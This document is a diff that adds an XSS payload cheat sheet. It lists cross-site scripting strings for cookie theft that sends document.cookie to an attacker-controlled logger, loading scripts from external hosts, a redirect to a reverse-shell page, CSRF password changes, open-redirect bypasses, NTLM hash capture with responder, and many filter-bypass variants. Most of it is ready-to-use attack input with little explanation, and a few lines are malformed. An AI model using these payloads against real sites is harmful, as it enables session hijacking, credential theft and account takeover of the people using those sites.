@@ -1,1 +1,61 @@
+# image inserting 
 <script>document.body.innerHTML=" <img src='https://play-lh.googleusercontent.com/QibzA-9E6K49loUUh7LZw_iBOR6zfDZ7sfU_lF3HPRK1YVmFwE8R4Jp8xOMZxvrb3C72' "</script>
+
+# reverse shell via XSS
+# forces web server to load and show your site/code on php or hta
+<script>window.location='http://<ip>/reverse_shell.php'</script>
+
+# example of password changing via XSS (change link) 
+http://192.168.0.14/bWAPP/csrf_1.php?password_new=ignite&password_conf=ignite&action=change
+
+# cookie grabbing
+"><script src=https://securityz.net/x.js?>
+window.location="http://yourServer.com/cookielogger.php?c="+document.cookie
+document.location="http://yourServer.com/cookielogger.php?c="+document.cookie
+# redirect via XSS
+<meta http-equiv="refresh" content="1;URL=https://securityz.net/vk.html" />
+
+# redirect method 2
+target[.]com/?redirect_to=evil[.]com => Warning Site
+
+# if you need to bypass just character capital O
+target[.]com/?redirect_to=evil[.]cOm => redirect to evil[.]com
+
+
+
+
+# NTLM hash remote spoofing with XSS
+# 1) start the responder:
+responder –I wlan0
+
+# 2) write down XSS
+<iframe src=http://192.168.0.12/scriptlet.html <
+
+# logs stored in /usr/share/responder/logs
+
+
+
+
+Target[.]com/?s=”><script>alert(1)</script> -> No result
+
+Copy and paste same parameter 2 times
+
+Target[.]com/?s=”><script>alert(1)</script>&s=”><script>alert(1)</script>
+
+Output : alert(1)
+
+# Filter bypass
+
+website.com/search.php?q="><script>alert('Priyanshu')</script>
+website.com/search.php?q="><script>alert("Priyanshu")</script>
+website.com/search.php?q="><script>alert("Priyanshu");</script>
+website.com/search.php?q="><script>alert(/Priyanshu");</script>
+website.com/search.php?q=//"><script>alert(/Priyanshu/);</script>
+website.com/search.php?q=xyz<script>alert(/Priyanshu/);</script>
+website.com/search.php?q=xyz"><script>alert(/Priyanshu/);</script>
+website.com/search.php?q=xyz"></script><script>alert(/Priyanshu/);</script>
+website.com/search.php?q=000"><script></script><script>alert(Priyanshu);</script>
+website.com/search.php?q=000xyz</script><script>alert(/Priyanshu/);</script>
+website.com/search.php?q=--<script>"></script>alert(/Priyanshu/);</script>
+website.com/search.php?q="><img src='javascript:alert('Priyanshu');'>
+website.com/search.php?q="><script src='https://virus.js'</script>
